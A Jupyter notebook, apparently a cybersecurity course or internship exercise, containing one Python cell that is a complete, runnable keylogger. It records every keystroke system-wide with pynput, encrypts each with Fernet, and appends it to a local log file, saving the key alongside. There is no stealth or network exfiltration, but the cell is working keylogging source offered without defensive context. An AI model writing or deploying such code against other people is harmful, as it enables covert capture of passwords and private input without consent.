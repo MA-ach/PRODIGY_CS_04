{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a159496",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "from cryptography.fernet import Fernet\n",
    "\n",
    "# Generate a key for encryption\n",
    "key = Fernet.generate_key()\n",
    "cipher_suite = Fernet(key)\n",
    "\n",
    "# Define the file to save the logs\n",
    "log_file = \"encrypted_key_log.txt\"\n",
    "key_file = \"key.key\"\n",
    "\n",
    "# Save the encryption key to a file\n",
    "with open(key_file, \"wb\") as kf:\n",
    "    kf.write(key)\n",
    "\n",
    "# Function to write encrypted keystrokes to the log file\n",
    "def write_to_file(encrypted_data):\n",
    "    with open(log_file, \"ab\") as f:\n",
    "        f.write(encrypted_data + b'\\n')\n",
    "\n",
    "# Function to handle key press events\n",
    "def on_press(key):\n",
    "    try:\n",
    "        data = str(key.char).encode()\n",
    "    except AttributeError:\n",
    "        data = str(key).encode()\n",
    "    encrypted_data = cipher_suite.encrypt(data)\n",
    "    write_to_file(encrypted_data)\n",
    "\n",
    "# Function to handle key release events\n",
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "\n",
    "# Set up the listener\n",
    "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
